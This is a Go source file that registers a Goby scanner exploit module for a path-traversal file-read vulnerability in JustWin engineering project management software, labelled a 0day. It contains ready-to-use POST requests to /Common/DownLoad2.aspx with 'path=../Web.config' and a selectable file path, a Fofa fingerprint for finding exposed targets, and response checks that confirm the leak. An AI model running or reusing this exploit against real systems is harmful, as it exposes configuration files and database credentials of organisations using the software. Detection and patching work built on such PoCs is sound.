package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "justwin  Engineering Project Management Software DownLoad2.aspx File Read",
    "Description": "<p>JustWin engineering management software is a comprehensive multi-party collaboration platform suitable for engineering investment. Enterprises can quickly establish enterprise-level comprehensive engineering project management and enterprise information management systems with engineering project management as the core, and build high-efficiency enterprise management systems. The information chain realizes enterprise business integration and high-efficiency collaborative office. There is a file reading vulnerability in the system, through which an attacker can obtain system file information.</p>",
    "Product": "PM8-Plus-Version",
    "Homepage": "http://www.justwin.cn",
    "DisclosureDate": "2022-12-01",
    "Author": "1angx",
    "FofaQuery": "body=\"Login/QRLogin.ashx\"",
    "GobyQuery": "body=\"Login/QRLogin.ashx\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.justwin.cn\">http://www.justwin.cn</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "select",
            "value": "Web.config,log.aspx,log4net.config",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/Common/DownLoad2.aspx",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "path=../Web.config&Name="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "cn.justwin.BLL.BasicProjectCode",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/Common/DownLoad2.aspx",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "path=../{{{filePath}}}&Name="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "建文工程项目管理软件 DownLoad2.aspx 文件读取漏洞",
            "Product": "建文工程项目管理软件（PM8-Plus版）",
            "Description": "<p>建文工程管理软件是一个适用于工程投资领域的综合型的多方协作平台，企业能够迅速建立以工程项目管理为核心的企业级综合性的工程项目管理与企业信息化管理系统,构建企业高效率的信息链,实现企业业务整合和高效率协同办公。该系统存在文件读取漏洞，攻击者可通过该漏洞获取系统文件信息。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.justwin.cn\" rel=\"nofollow\">http://www.justwin.cn</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "justwin  Engineering Project Management Software DownLoad2.aspx File Read",
            "Product": "PM8-Plus-Version",
            "Description": "<p>JustWin engineering management software is a comprehensive multi-party collaboration platform suitable for engineering investment. Enterprises can quickly establish enterprise-level comprehensive engineering project management and enterprise information management systems with engineering project management as the core, and build high-efficiency enterprise management systems. The information chain realizes enterprise business integration and high-efficiency collaborative office. There is a file reading vulnerability in the system, through which an attacker can obtain system file information.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.justwin.cn\" rel=\"nofollow\">http://www.justwin.cn</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}